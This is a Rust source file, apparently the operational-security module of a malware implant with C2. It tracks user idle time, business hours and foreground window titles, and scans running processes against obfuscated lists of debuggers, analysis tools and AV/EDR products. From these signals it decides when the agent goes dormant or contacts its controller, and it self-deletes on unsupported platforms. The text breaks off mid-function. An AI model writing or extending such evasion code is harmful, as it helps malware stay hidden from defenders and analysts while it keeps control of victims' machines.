use log::{debug, error, warn, info};
use std::sync::Mutex;
use chrono::Timelike;
use std::process;
use once_cell::sync::Lazy;
use obfstr::obfstr;
use std::time::{Duration, Instant};
use std::sync::atomic::AtomicBool;

// --- NEW: OPSEC Scoring Constants ---
const SCORE_DECAY_FACTOR: f32 = 0.95; // Decay score by 5% each cycle
const SCORE_CLAMP_MIN: f32 = 0.0;
const SCORE_CLAMP_MAX: f32 = 100.0;

// Signal Weights (Example values, tune as needed)
const WEIGHT_HIGH_THREAT_PROCESS: f32 = 40.0;
const WEIGHT_BUSINESS_HOURS: f32 = 2.0;
const WEIGHT_USER_ACTIVE: f32 = 15.0; // Add score if user is *not* idle
const WEIGHT_SUSPICIOUS_WINDOW: f32 = 30.0; // NEW Weight
const WEIGHT_C2_UNSTABLE: f32 = 25.0; // NEW Weight for C2 issues
const WEIGHT_NOISY_COMMAND_EXECUTION: f32 = 20.0; // NEW Weight for executing noisy commands

// --- NEW: Threshold Adjustment Constants ---
const THRESHOLD_ADJUSTMENT_STABLE: f32 = 10.0; // Increase threshold when stable (user idle/off-hours)
const THRESHOLD_ADJUSTMENT_UNSTABLE: f32 = -10.0; // Decrease threshold when unstable (user active/business hours)
const THRESHOLD_MIN_CLAMP: f32 = 10.0; // Prevent thresholds from becoming too low
const THRESHOLD_MAX_CLAMP: f32 = 90.0; // Prevent thresholds from becoming too high

// --- NEW: Redefined Thresholds for 3 Modes --- 
// Score ranges: Background < LOW_SCORE_THRESHOLD <= ReducedActivity < HIGH_SCORE_THRESHOLD <= FullOpsec
// These consts are now removed as they will come from AgentConfig
// const LOW_SCORE_THRESHOLD: f32 = 20.0;  // Threshold between Background and Reduced
// const HIGH_SCORE_THRESHOLD: f32 = 60.0; // Threshold between Reduced and Full
// We derive the specific transition thresholds from these boundaries
// const THRESHOLD_ENTER_REDUCED_ACTIVITY: f32 = LOW_SCORE_THRESHOLD; // Go Background -> Reduced if score >= LOW
// const THRESHOLD_EXIT_REDUCED_ACTIVITY: f32 = LOW_SCORE_THRESHOLD;  // Go Reduced -> Background if score < LOW
// const THRESHOLD_ENTER_FULL_OPSEC: f32 = HIGH_SCORE_THRESHOLD;      // Go Reduced -> Full if score >= HIGH
// const THRESHOLD_EXIT_FULL_OPSEC: f32 = HIGH_SCORE_THRESHOLD;       // Go Full -> Reduced if score < HIGH
// --- END NEW THRESHOLDS ---

// --- NEW: Correlation Bonus Constants ---
const CORRELATION_BONUS_ACTIVE_DURING_BUSINESS_HOURS: f32 = 15.0; // User active + Business hours
const CORRELATION_BONUS_HIGH_THREAT_AND_USER_ACTIVE: f32 = 20.0; // High threat process + User active
const CORRELATION_BONUS_SUSPICIOUS_WINDOW_AND_ACTIVE: f32 = 25.0; // NEW Bonus
const CORRELATION_BONUS_C2_UNSTABLE_AND_ACTIVE: f32 = 15.0; // Enabled
// --- END NEW ---

// --- NEW: Noisy Command Recency Threshold ---
const NOISY_COMMAND_RECENCY_THRESHOLD_SECS: u64 = 10; // Consider command recent if executed within 10s
// --- END NEW ---

// Static lists of obfuscated strings, now storing owned Strings
static HIGH_THREAT_ANALYSIS_TOOLS: Lazy<Vec<String>> = Lazy::new(|| {
    vec![
        obfstr!("ollydbg").to_string(), obfstr!("ProcessHacker").to_string(), obfstr!("tcpview").to_string(), obfstr!("autoruns").to_string(), 
        obfstr!("autorunsc").to_string(), obfstr!("filemon").to_string(), obfstr!("procmon").to_string(), obfstr!("regmon").to_string(), 
        obfstr!("procexp").to_string(), obfstr!("idaq").to_string(), obfstr!("idaq64").to_string(), obfstr!("ImmunityDebugger").to_string(), 
        obfstr!("Wireshark").to_string(), obfstr!("dumpcap").to_string(), obfstr!("HookExplorer").to_string(), obfstr!("ImportREC").to_string(), 
        obfstr!("PETools").to_string(), obfstr!("LordPE").to_string(), obfstr!("SysInspector").to_string(), obfstr!("proc_analyzer").to_string(), 
        obfstr!("sysAnalyzer").to_string(), obfstr!("sniff_hit").to_string(), obfstr!("windbg").to_string(), obfstr!("joeboxcontrol").to_string(), 
        obfstr!("joeboxserver").to_string(), obfstr!("ResourceHacker").to_string(), obfstr!("x32dbg").to_string(), obfstr!("x64dbg").to_string(), 
        obfstr!("Fiddler").to_string(), obfstr!("httpdebugger").to_string(),
    ]
});

static COMMON_AV_EDR_PROCESSES: Lazy<Vec<String>> = Lazy::new(|| {
    vec![
        obfstr!("MsMpEng").to_string(), obfstr!("msmpeng").to_string(), obfstr!("Defender").to_string(), obfstr!("defender").to_string(), 
        obfstr!("carbonblack").to_string(), obfstr!("cb").to_string(), obfstr!("sentinelone").to_string(), obfstr!("cybereason").to_string(),
        obfstr!("crowdstrike").to_string(), obfstr!("falcon").to_string(), obfstr!("tanium").to_string(), obfstr!("symantec").to_string(),
    ]
});

// --- NEW: Suspicious Window Titles List ---
static SUSPICIOUS_WINDOW_TITLES: Lazy<Vec<String>> = Lazy::new(|| {
    vec![
        // Common analysis tools often reflected in window titles
        obfstr!("Wireshark").to_string(), obfstr!("ollydbg").to_string(), obfstr!("Immunity Debugger").to_string(),
        obfstr!("x64dbg").to_string(), obfstr!("x32dbg").to_string(), obfstr!("Windbg").to_string(),
        obfstr!("Process Hacker").to_string(), obfstr!("Process Explorer").to_string(), obfstr!("Sysinternals").to_string(),
        obfstr!("IDA Pro").to_string(), obfstr!("Ghidra").to_string(), obfstr!("Fiddler").to_string(),
        obfstr!("Charles Proxy").to_string(), obfstr!("HTTP Debugger").to_string(),
        // Add more potential titles
    ]
});
// --- END NEW ---

// Opsec mode per default on High risk to ensure maximum security.
// This module is responsible for detecting the current opsec level based on user activity and system state.
// In short, this ensure the agent to be highly paranoid.

#[derive(Debug, Clone, Copy, PartialEq)] // Removed Eq due to f32
pub struct OpsecState {
    pub mode: AgentMode,
    pub current_score: f32, // NEW: Track the score
    pub consecutive_c2_failures: u32, // NEW: Track C2 failures
    pub last_transition: std::time::Instant,
    // --- NEW Adaptive C2 Threshold State ---
    pub dynamic_max_c2_failures: u32,
    pub last_c2_threshold_adjustment: std::time::Instant,
    pub dynamic_threshold_initialized: bool,
    // --- END NEW ---
    // --- NEW Noisy Command State ---
    pub last_noisy_command_time: Option<std::time::Instant>,
    // --- END NEW ---
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum OpsecLevel {
    High, // High risk, user present/active or unknown
    Low,  // Low risk, user idle/locked and checks passed
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum AgentMode {
    FullOpsec,      // Encrypted, dormant, no C2
    ReducedActivity,// NEW: Encrypted, minimal C2 (or none), queue commands, longer sleep
    BackgroundOpsec // Encrypted or unencrypted (based on state), active C2 & commands
}

pub static OPSEC_STATE: Lazy<Mutex<OpsecState>> = Lazy::new(|| Mutex::new(OpsecState {
    mode: AgentMode::FullOpsec,
    current_score: SCORE_CLAMP_MAX, // Start at max score (fully cautious)
    consecutive_c2_failures: 0, // NEW: Initialize counter
    last_transition: std::time::Instant::now(),
    // --- NEW Adaptive C2 Threshold State ---
    dynamic_max_c2_failures: 0, // Initialize to 0, will be set from config on first run
    last_c2_threshold_adjustment: std::time::Instant::now(),
    dynamic_threshold_initialized: false,
    // --- END NEW ---
    // --- NEW Noisy Command State ---
    last_noisy_command_time: None,
    // --- END NEW ---
}));

pub fn check_idle_level() -> OpsecLevel {
    debug!("[OPSEC] check_idle_level() called");
    #[cfg(target_os = "windows")]
    {
        let idle = check_user_idle_windows();
        debug!("[OPSEC] check_user_idle_windows() returned: {}", idle);
        if idle {
            debug!("[OPSEC] All user presence checks passed: switching to Low Opsec.");
            OpsecLevel::Low
        } else {
            debug!("[OPSEC] User is present or checks failed: staying in High Opsec.");
            OpsecLevel::High
        }
    }
    #[cfg(target_os = "linux")]
    {
        let idle = check_user_idle_linux();
        debug!("[OPSEC] check_user_idle_linux() returned: {}", idle);
        if idle {
            debug!("[OPSEC] Linux X11 idle detected: switching to Low Opsec.");
            OpsecLevel::Low
        } else {
            debug!("[OPSEC] Linux X11 user present or check failed: staying in High Opsec.");
            OpsecLevel::High
        }
    }
    
    // 
    #[cfg(not(any(target_os = "windows", target_os = "linux")))]
    {
        debug!("[OPSEC] Unsupported platform detected. Self-deleting and exiting.");
        perform_self_cleanup();
    }
}

pub fn determine_agent_mode(config: &crate::config::AgentConfig) -> AgentMode {
    // --- First, potentially adjust C2 threshold --- 
    { // Scope for mutex lock
        let mut opsec_state_guard = OPSEC_STATE.lock().unwrap();
        adjust_c2_failure_threshold(&mut opsec_state_guard, config);
    } // Lock released here
    // --- End C2 Threshold Adjustment ---

    // 1. Gather Context Signals
    let mut context = OpsecContext::default();
    context.is_business_hours = check_business_hours();
    context.user_idle_level = check_idle_level();
    context.suspicious_window_detected = check_window_state();
    context.c2_connection_unstable = check_c2_stability(); // NEW: Call C2 stability check

    // --- Adaptive interval logic for process scan ---
    let current_score;
    { // Scope for mutex lock
        let state = OPSEC_STATE.lock().unwrap();
        current_score = state.current_score;
    } // Lock released here

    let mut base_interval = config.proc_scan_interval_secs;
    if context.is_business_hours { base_interval = base_interval.min(120); }
    if current_score > 75.0 { base_interval = base_interval.min(30); }
    else if current_score > 40.0 { base_interval = base_interval.min(60); }
    if context.user_idle_level == OpsecLevel::Low { base_interval = base_interval.max(300); }

    let jitter = rand::random::<u64>() % 61;
    let adaptive_interval = base_interval + jitter;
    debug!(
        "[OPSEC INTERVAL] Adaptive Interval: {}s (Base: {}, Jitter: {}, Score: {:.1}, Idle: {:?})",
        adaptive_interval, config.proc_scan_interval_secs, jitter, current_score, context.user_idle_level
    );

    // Perform process check and add to context
    context.high_threat_process_detected = check_proc_state(adaptive_interval);

    // 2. Update Score and Determine Mode
    let determined_mode;
    { // Scope for mutex lock
        let mut opsec_state_guard = OPSEC_STATE.lock().unwrap();
        determined_mode = update_opsec_score_and_mode(&mut opsec_state_guard, &context, config);
    } // Lock released here

    determined_mode
}

#[cfg(target_os = "windows")]
fn check_user_idle_windows() -> bool {
    use std::ptr;
    use winapi::um::winuser::{LASTINPUTINFO, GetLastInputInfo, OpenInputDesktop, GetForegroundWindow};
    use winapi::shared::minwindef::{DWORD, FALSE};
    use crate::opsec::wts_ffi::*;

    let mut is_considered_idle = false;
    let mut reason = String::from("Defaulting to active.");

    // 1. Check idle time
    unsafe {
        let mut lii = LASTINPUTINFO {
            cbSize: std::mem::size_of::<LASTINPUTINFO>() as u32,
            dwTime: 0,
        };
        if GetLastInputInfo(&mut lii) != 0 {
            let tick_count = winapi::um::sysinfoapi::GetTickCount();
            let idle_time_ms = tick_count.wrapping_sub(lii.dwTime); // Use wrapping_sub for tick count overflows
            debug!("[OPSEC] Raw system idle time: {} ms", idle_time_ms);
            // If user has been idle for more than 5 minutes, consider them idle.
            if idle_time_ms > 5 * 60 * 1000 { 
                is_considered_idle = true;
                reason = format!("User idle for {}ms (> 5min)", idle_time_ms);
            } else {
                reason = format!("User not idle (idle_time {}ms <= 5min).", idle_time_ms);
                debug!("[OPSEC] {}", reason);
                // Optional: Could still check for locked screen even if idle time is short
                // For now, if not past raw idle threshold, consider active for this function's purpose.
                // return false; // Early exit if primary idle check fails
            }
        } else {
            warn!("[OPSEC] GetLastInputInfo failed, assuming user is active.");
            // return false; // Assuming active if API fails
            is_considered_idle = false; // Explicitly not idle
            reason = "GetLastInputInfo failed".to_string();
        }
    }

    // Additional checks for more confidence (optional, can be used to adjust opsec score later)
    // For now, the primary decision is based on raw idle time.
    // If is_considered_idle is already true, we can log other states.
    if is_considered_idle {
        unsafe {
            let hdesk = OpenInputDesktop(0, FALSE, 0x0100); // GENERIC_READ
            if hdesk.is_null() {
                debug!("[OPSEC] Desktop is locked or inaccessible (supports idle state).");
            } else {
                debug!("[OPSEC] Desktop is unlocked.");
                // winapi::um::handleapi::CloseHandle(hdesk); // Close the handle
            }

            let mut session_state_ptr: *mut WTS_CONNECTSTATE_CLASS = ptr::null_mut();
            let mut bytes_returned: DWORD = 0;
            if WTSQuerySessionInformationW(
                ptr::null_mut(), // WTS_CURRENT_SERVER_HANDLE
                WTS_CURRENT_SESSION, // Current session
                WTSConnectState, // Info class for session state (usually 0 for this enum, but use the constant)
                &mut session_state_ptr as *mut _ as *mut *mut std::os::raw::c_void as *mut winapi::shared::ntdef::LPWSTR, // Correct casting for ppBuffer
                &mut bytes_returned,
            ) != 0 && !session_state_ptr.is_null() {
                let session_state_val = *session_state_ptr;
                debug!("[OPSEC] Session state: {:?}", session_state_val);
                if session_state_val != WTS_CONNECTSTATE_CLASS::WTSActive {
                    debug!("[OPSEC] Session is not active (supports idle state).");
                }
                // WTSFreeMemory(session_state_ptr as *mut std::os::raw::c_void); // Free memory
            } else {
                warn!("[OPSEC] WTSQuerySessionInformationW failed or state is null.");
            }

            let fg_window = GetForegroundWindow();
            if fg_window.is_null() {
                debug!("[OPSEC] No foreground window detected (supports idle state).");
            } else {
                debug!("[OPSEC] Foreground window present.");
            }
        }
    }
    
    debug!("[OPSEC] check_user_idle_windows final decision: is_idle = {}, Reason: {}", is_considered_idle, reason);
    is_considered_idle // Return based on the primary idle time check for now
}

#[cfg(not(target_os = "windows"))]
fn check_user_idle_windows() -> bool {
    debug!("[OPSEC] check_user_idle_windows() called on non-Windows platform.");
    false
}

#[cfg(target_os = "linux")]
fn check_user_idle_linux() -> bool {
    use log::{debug, error};
    use std::ffi::c_void;
    use std::ptr;
    use libc::{dlopen, dlsym, RTLD_LAZY, c_char, c_ulong, c_int};

    debug!("[OPSEC] check_user_idle_linux() called");

    unsafe {
        // Open libX11
        let x11 = dlopen(b"libX11.so.6\0".as_ptr() as *const c_char, RTLD_LAZY);
        if x11.is_null() {
            error!("[OPSEC] Failed to open libX11.so.6");
            return false;
        }
        // Open libXss
        let xss = dlopen(b"libXss.so.1\0".as_ptr() as *const c_char, RTLD_LAZY);
        if xss.is_null() {
            error!("[OPSEC] Failed to open libXss.so.1");
            return false;
        }

        // Load XOpenDisplay
        let xopen_display: Option<unsafe extern "C" fn(*const c_char) -> *mut c_void> =
            std::mem::transmute(dlsym(x11, b"XOpenDisplay\0".as_ptr() as *const c_char));
        if xopen_display.is_none() {
            error!("[OPSEC] dlsym for XOpenDisplay failed");
            return false;
        }
        let xopen_display = xopen_display.unwrap();

        // Load XDefaultRootWindow
        let xdefault_root_window: Option<unsafe extern "C" fn(*mut c_void) -> c_ulong> =
            std::mem::transmute(dlsym(x11, b"XDefaultRootWindow\0".as_ptr() as *const c_char));
        if xdefault_root_window.is_none() {
            error!("[OPSEC] dlsym for XDefaultRootWindow failed");
            return false;
        }
        let xdefault_root_window = xdefault_root_window.unwrap();

        // Load XScreenSaverAllocInfo
        let xscreensaver_alloc_info: Option<unsafe extern "C" fn() -> *mut c_void> =
            std::mem::transmute(dlsym(xss, b"XScreenSaverAllocInfo\0".as_ptr() as *const c_char));
        if xscreensaver_alloc_info.is_none() {
            error!("[OPSEC] dlsym for XScreenSaverAllocInfo failed");
            return false;
        }
        let xscreensaver_alloc_info = xscreensaver_alloc_info.unwrap();

        // Load XScreenSaverQueryInfo
        let xscreensaver_query_info: Option<unsafe extern "C" fn(*mut c_void, c_ulong, *mut c_void) -> c_int> =
            std::mem::transmute(dlsym(xss, b"XScreenSaverQueryInfo\0".as_ptr() as *const c_char));
        if xscreensaver_query_info.is_none() {
            error!("[OPSEC] dlsym for XScreenSaverQueryInfo failed");
            return false;
        }
        let xscreensaver_query_info = xscreensaver_query_info.unwrap();

        // Open display
        let display = xopen_display(ptr::null());
        if display.is_null() {
            error!("[OPSEC] XOpenDisplay failed (no X11 session?)");
            return false;
        }

        // Get root window
        let root = xdefault_root_window(display);

        // Allocate info struct
        let info = xscreensaver_alloc_info();
        if info.is_null() {
            error!("[OPSEC] XScreenSaverAllocInfo failed");
            return false;
        }

        // Query info
        let res = xscreensaver_query_info(display, root, info);
        if res == 0 {
            error!("[OPSEC] XScreenSaverQueryInfo failed");
            return false;
        }

        // The struct layout for XScreenSaverInfo:
        #[repr(C)]
        struct XScreenSaverInfo {
            window: c_ulong,
            state: c_int,
            kind: c_int,
            til_or_since: c_ulong,
            idle: c_ulong,
            event_mask: c_ulong,
        }

        let xs_info = &*(info as *const XScreenSaverInfo);
        debug!("[OPSEC] X11 idle time: {} ms", xs_info.idle);

        // Consider idle if more than 5 minutes (300_000 ms)
        xs_info.idle > 300_000
    }
}

// Self delete and exit
pub fn perform_self_cleanup() -> ! {
    use std::env;
    use std::fs;

    debug!("[OPSEC] Performing self-cleanup..."); // Added debug log
    if let Ok(path) = env::current_exe() {
        debug!("[OPSEC] Attempting to remove executable at: {:?}", path); // Added debug log
        if fs::remove_file(&path).is_ok() { // Added result check
            debug!("[OPSEC] Self-deletion successful.");
        } else {
            debug!("[OPSEC] Self-deletion failed.");
        }
    }
    process::exit(0);
}

// Renamed fields to reflect raw signal state
#[derive(Debug)] // Keep only Debug
struct OpsecContext {
    is_business_hours: bool,
    high_threat_process_detected: bool,
    suspicious_window_detected: bool,
    c2_connection_unstable: bool, // NEW FIELD
    user_idle_level: OpsecLevel,
}

// Manual implementation of Default for OpsecContext
impl Default for OpsecContext {
    fn default() -> Self {
        Self {
            is_business_hours: false,
            high_threat_process_detected: false,
            suspicious_window_detected: false,
            c2_connection_unstable: false,
            user_idle_level: OpsecLevel::High, // Default to High (cautious)
        }
    }
}

fn check_business_hours() -> bool {
    let now = chrono::Local::now();
    let hour = now.hour();
    // 8am to 6pm considered business hours
    hour >= 8 && hour < 18
}

static PROC_SCAN_CACHE: Lazy<Mutex<(Instant, bool)>> = Lazy::new(|| Mutex::new((Instant::now() - Duration::from_secs(600), false)));

pub fn check_proc_state(proc_scan_interval: u64) -> bool {
    // Protect against too frequent checks
    {
        let mut last_check_time = LAST_CHECK_TIME.lock().unwrap();
        if last_check_time.elapsed() < Duration::from_secs(proc_scan_interval) {
            debug!("[OPSEC] Process check skipped, interval not elapsed.");
            return LAST_PROC_STATE.load(std::sync::atomic::Ordering::Relaxed); // Return last known state
        }
        *last_check_time = Instant::now(); // Update last check time
    }

    let mut s = sysinfo::System::new_with_specifics(
        sysinfo::RefreshKind::everything().with_processes(sysinfo::ProcessRefreshKind::everything())
    );
    s.refresh_processes_specifics(sysinfo::ProcessesToUpdate::All, true, sysinfo::ProcessRefreshKind::everything()); // Corrected refresh call

    let mut high_threat_found = false;
    let mut common_av_found = false;

    for process in s.processes().values() {
        let process_name_os = process.name();
        let process_name_str = process_name_os.to_string_lossy();
        let process_name_lc = process_name_str.to_lowercase();
        
        let process_exe_path = process.exe().unwrap_or_else(|| std::path::Path::new(""));
        let process_exe_filename_os = process_exe_path.file_name().unwrap_or_else(|| std::ffi::OsStr::new(""));
        let process_exe_filename_str = process_exe_filename_os.to_string_lossy();
        let process_exe_lc = process_exe_filename_str.to_lowercase();

        for tool_name_string in &*HIGH_THREAT_ANALYSIS_TOOLS {
            let tool_name: &str = &*tool_name_string; // Deref String to &str
            if process_name_lc.contains(tool_name) || process_exe_lc.contains(tool_name) {
                warn!("[OPSEC] High-threat analysis tool detected: {} (Process: {}, EXE: {})", 
                       tool_name, 
                       process_name_os.to_string_lossy(), 
                       process_exe_path.to_string_lossy());
                high_threat_found = true;
            }
        }

        for av_name_string in &*COMMON_AV_EDR_PROCESSES {
            let av_name: &str = &*av_name_string; // Deref String to &str
            if process_name_lc.contains(av_name) || process_exe_lc.contains(av_name) {
                info!("[OPSEC] Common AV/EDR process detected: {} (Process: {}, EXE: {})", 
                       av_name, 
                       process_name_os.to_string_lossy(), 
                       process_exe_path.to_string_lossy());
                common_av_found = true;
            }
        }
    }

    if common_av_found && !high_threat_found {
        debug!("[OPSEC] Common AV/EDR processes detected, but no high-threat analysis tools. Not escalating to FullOpsec based on this alone.");
    }
    
    // Update the cache with the current finding
    LAST_PROC_STATE.store(high_threat_found, std::sync::atomic::Ordering::Relaxed);
    // Note: LAST_CHECK_TIME is updated at the beginning of the function if a scan proceeds.

    high_threat_found // This will set context.unusual_process only if a high-threat tool is found
}

static LAST_CHECK_TIME: Lazy<Mutex<Instant>> = Lazy::new(|| Mutex::new(Instant::now() - Duration::from_secs(1000))); // Initialize to allow first check
static LAST_PROC_STATE: Lazy<AtomicBool> = Lazy::new(|| AtomicBool::new(false));

// --- NEW: Scoring and Mode Update Logic ---
fn update_opsec_score_and_mode(
    opsec_state: &mut OpsecState,
    context: &OpsecContext,
    config: &crate::config::AgentConfig
) -> AgentMode {
    // 1. Apply Decay
    opsec_state.current_score *= SCORE_DECAY_FACTOR;

    // 2. Add Weighted Contributions
    let mut score_increase: f32 = 0.0;
    let user_is_active = context.user_idle_level == OpsecLevel::High;
    
    if context.is_business_hours {
        score_increase += WEIGHT_BUSINESS_HOURS;
        debug!("[OPSEC SCORE] +{:.1} (Business Hours)", WEIGHT_BUSINESS_HOURS);
    }
    if context.high_threat_process_detected {
        score_increase += WEIGHT_HIGH_THREAT_PROCESS;
         debug!("[OPSEC SCORE] +{:.1} (High Threat Process)", WEIGHT_HIGH_THREAT_PROCESS);
    }
    if user_is_active { // User is active
        score_increase += WEIGHT_USER_ACTIVE;
         debug!("[OPSEC SCORE] +{:.1} (User Active)", WEIGHT_USER_ACTIVE);
    }
    if context.suspicious_window_detected { 
        score_increase += WEIGHT_SUSPICIOUS_WINDOW;
         debug!("[OPSEC SCORE] +{:.1} (Suspicious Window)", WEIGHT_SUSPICIOUS_WINDOW);
    }
    if context.c2_connection_unstable { // NEW: Check C2 stability signal
        score_increase += WEIGHT_C2_UNSTABLE;
         debug!("[OPSEC SCORE] +{:.1} (C2 Unstable)", WEIGHT_C2_UNSTABLE);
    }
    
    // NEW: Check for recent noisy command execution
    if let Some(last_noisy_time) = opsec_state.last_noisy_command_time {
        if last_noisy_time.elapsed() < Duration::from_secs(NOISY_COMMAND_RECENCY_THRESHOLD_SECS) {
            score_increase += WEIGHT_NOISY_COMMAND_EXECUTION;
            debug!("[OPSEC SCORE] +{:.1} (Recent Noisy Command)", WEIGHT_NOISY_COMMAND_EXECUTION);
            // Optional: Consider resetting the time here so it only applies once per command?
            // opsec_state.last_noisy_command_time = None;
        }
    }
    
    // 2b. Add Correlation Bonuses
    if user_is_active && context.is_business_hours {
        score_increase += CORRELATION_BONUS_ACTIVE_DURING_BUSINESS_HOURS;
        debug!("[OPSEC SCORE] +{:.1} (Correlation: Active during Business Hours)", CORRELATION_BONUS_ACTIVE_DURING_BUSINESS_HOURS);
    }
    if context.high_threat_process_detected && user_is_active {
        score_increase += CORRELATION_BONUS_HIGH_THREAT_AND_USER_ACTIVE;
        debug!("[OPSEC SCORE] +{:.1} (Correlation: High Threat and User Active)", CORRELATION_BONUS_HIGH_THREAT_AND_USER_ACTIVE);
    }
    if context.suspicious_window_detected && user_is_active { 
        score_increase += CORRELATION_BONUS_SUSPICIOUS_WINDOW_AND_ACTIVE;
        debug!("[OPSEC SCORE] +{:.1} (Correlation: Suspicious Window and User Active)", CORRELATION_BONUS_SUSPICIOUS_WINDOW_AND_ACTIVE);
    }
    if context.c2_connection_unstable && user_is_active { // Enabled this correlation
        score_increase += CORRELATION_BONUS_C2_UNSTABLE_AND_ACTIVE;
        debug!("[OPSEC SCORE] +{:.1} (Correlation: C2 Unstable and User Active)", CORRELATION_BONUS_C2_UNSTABLE_AND_ACTIVE);
    }

    opsec_state.current_score += score_increase;

    // 3. Clamp Score
    opsec_state.current_score = opsec_state.current_score.clamp(SCORE_CLAMP_MIN, SCORE_CLAMP_MAX);
    debug!("[OPSEC SCORE] Decayed & Updated Score: {:.2}", opsec_state.current_score);

    // 4. Calculate Dynamic Thresholds (Adjust the boundaries)
    let mut adjustment: f32 = 0.0;

    // --- Refactor stability_reason assignment (ensure this is the only assignment block for it) ---
    let stability_reason = 
        if context.user_idle_level == OpsecLevel::Low && !context.is_business_hours {
            adjustment = THRESHOLD_ADJUSTMENT_STABLE;
            "Stable (Idle, Off-Hours)".to_string()
        } else if context.user_idle_level == OpsecLevel::High || context.is_business_hours {
            adjustment = THRESHOLD_ADJUSTMENT_UNSTABLE;
            format!("Unstable (Active:{}, BusinessHrs:{})", context.user_idle_level == OpsecLevel::High, context.is_business_hours)
        } else {
            // No adjustment for neutral cases, adjustment remains 0.0
            "Neutral (Idle during BusinessHrs?)".to_string()
        };
    // --- End Refactor ---

    // Calculate dynamic boundaries using base thresholds from config
    let dynamic_low_threshold = (config.base_score_threshold_bg_to_reduced + adjustment)
                                .clamp(THRESHOLD_MIN_CLAMP, THRESHOLD_MAX_CLAMP);
    let dynamic_high_threshold = (config.base_score_threshold_reduced_to_full + adjustment)
                                 .clamp(dynamic_low_threshold + 1.0, THRESHOLD_MAX_CLAMP); // Ensure High > Low

    // Derive dynamic transition thresholds (could simplify, but explicit for clarity)
    let dyn_enter_reduced = dynamic_low_threshold;
    let dyn_exit_reduced = dynamic_low_threshold;
    let dyn_enter_full = dynamic_high_threshold;
    let dyn_exit_full = dynamic_high_threshold;

    debug!(
        "[OPSEC THRESHOLD] Dynamic Adjustment: {:.1} ({}), LowBoundary: {:.1}, HighBoundary: {:.1}",
        adjustment, stability_reason, dynamic_low_threshold, dynamic_high_threshold
    );

    // 5. Determine Potential New Mode using Dynamic Hysteresis (3 States)
    let current_mode = opsec_state.mode;
    let score = opsec_state.current_score; // Use local variable for score
    let potential_new_mode = match current_mode {
        AgentMode::BackgroundOpsec => {
            if score >= dyn_enter_reduced { // Score high enough to leave Background
                if score >= dyn_enter_full { AgentMode::FullOpsec } // High enough for Full
                else { AgentMode::ReducedActivity } // Else, enter Reduced
            } else {
                AgentMode::BackgroundOpsec // Stay Background
            }
        }
        AgentMode::ReducedActivity => {
            if score < dyn_exit_reduced { AgentMode::BackgroundOpsec } // Score low enough for Background
            else if score >= dyn_enter_full { AgentMode::FullOpsec } // Score high enough for Full
            else { AgentMode::ReducedActivity } // Stay Reduced
        }
        AgentMode::FullOpsec => {
            if score < dyn_exit_full { // Score low enough to leave Full
                 if score < dyn_exit_reduced { AgentMode::BackgroundOpsec } // Low enough for Background
                 else { AgentMode::ReducedActivity } // Else, enter Reduced
            } else {
                AgentMode::FullOpsec // Stay Full
            }
        }
    };

    // 6. Check Time Buffers (Cool-down) - Updated for 3 states
    let actual_new_mode: AgentMode; // Declare without initializing
    if potential_new_mode != current_mode {
        let time_since_last_transition = opsec_state.last_transition.elapsed();
        // Determine required duration based on the state we are *currently in*
        let required_duration = match current_mode {
            AgentMode::FullOpsec => Duration::from_secs(config.min_duration_full_opsec_secs),
            AgentMode::ReducedActivity => Duration::from_secs(config.min_duration_reduced_activity_secs),
            AgentMode::BackgroundOpsec => Duration::from_secs(config.min_duration_background_opsec_secs),
        };

        if time_since_last_transition >= required_duration {
            actual_new_mode = potential_new_mode;
            debug!(
                "[OPSEC MODE] Cool-down ({:?}) finished. Allowing transition from {:?} to {:?}.",
                required_duration, current_mode, actual_new_mode
            );
        } else {
            actual_new_mode = current_mode; // Force stay
            debug!(
                "[OPSEC MODE] Cool-down active for {:?}. Preventing transition from {:?} to {:?} (elapsed: {:?}, required: {:?}).",
                 current_mode, current_mode, potential_new_mode, time_since_last_transition, required_duration
            );
        }
    } else {
        actual_new_mode = current_mode; // Assign here if no potential change
    }

    // 7. Update State if Mode ACTUALLY Changed
    if actual_new_mode != current_mode {
        info!(
            "[OPSEC MODE] Transitioning from {:?} to {:?} (Score: {:.2}, DynThresholds: Low={:.1}/High={:.1})",
            current_mode, actual_new_mode, opsec_state.current_score, dynamic_low_threshold, dynamic_high_threshold
        );
        opsec_state.mode = actual_new_mode;
        opsec_state.last_transition = Instant::now();
    } else {
         debug!(
             "[OPSEC MODE] Remaining in {:?} (Score: {:.2}, DynThresholds: Low={:.1}/High={:.1})",
             current_mode, opsec_state.current_score, dynamic_low_threshold, dynamic_high_threshold
         );
    }

    opsec_state.mode
}
// --- END NEW ---

// TODO: Implement Sandbox detection
// pub fn is_sandboxed() -> bool { false }

//TODO: Implement Debugger detection
// pub fn is_debugged() -> bool { false }

// Placeholder: returns false, implement with platform-specific code for real use
//fn check_window_state() -> bool { false }

// Placeholder: returns false, implement with platform-specific code for real use
//fn check_network_state() -> bool { false }

// --- NEW: Window Check Logic ---
static LAST_WINDOW_CHECK_TIME: Lazy<Mutex<Instant>> = Lazy::new(|| Mutex::new(Instant::now() - Duration::from_secs(1000)));
static LAST_WINDOW_STATE: Lazy<AtomicBool> = Lazy::new(|| AtomicBool::new(false));
const WINDOW_CHECK_INTERVAL_SECS: u64 = 15; // Check windows more frequently than processes? (tune)

// Main function to check window state (calls platform-specific impl)
pub fn check_window_state() -> bool {
    {
        let mut last_check_guard = LAST_WINDOW_CHECK_TIME.lock().unwrap();
        if last_check_guard.elapsed() < Duration::from_secs(WINDOW_CHECK_INTERVAL_SECS) {
            debug!("[OPSEC WINDOW] Check skipped, interval not elapsed.");
            return LAST_WINDOW_STATE.load(std::sync::atomic::Ordering::Relaxed);
        }
        *last_check_guard = Instant::now(); // Update check time
    }

    let found_suspicious = check_foreground_window_title(); // Call platform-specific impl

    LAST_WINDOW_STATE.store(found_suspicious, std::sync::atomic::Ordering::Relaxed);
    found_suspicious
}

// Platform-specific implementations
#[cfg(target_os = "windows")]
fn check_foreground_window_title() -> bool {
    use winapi::um::winuser::{GetForegroundWindow, GetWindowTextW};
    use winapi::shared::minwindef::MAX_PATH;
    use std::ffi::OsString;
    use std::os::windows::ffi::OsStringExt;

    let hwnd = unsafe { GetForegroundWindow() };
    if hwnd.is_null() {
        debug!("[OPSEC WINDOW] No foreground window found.");
        return false; // No window, no suspicious title
    }

    let mut buffer: Vec<u16> = vec![0; MAX_PATH as usize];
    let len = unsafe { GetWindowTextW(hwnd, buffer.as_mut_ptr(), buffer.len() as i32) };

    if len <= 0 {
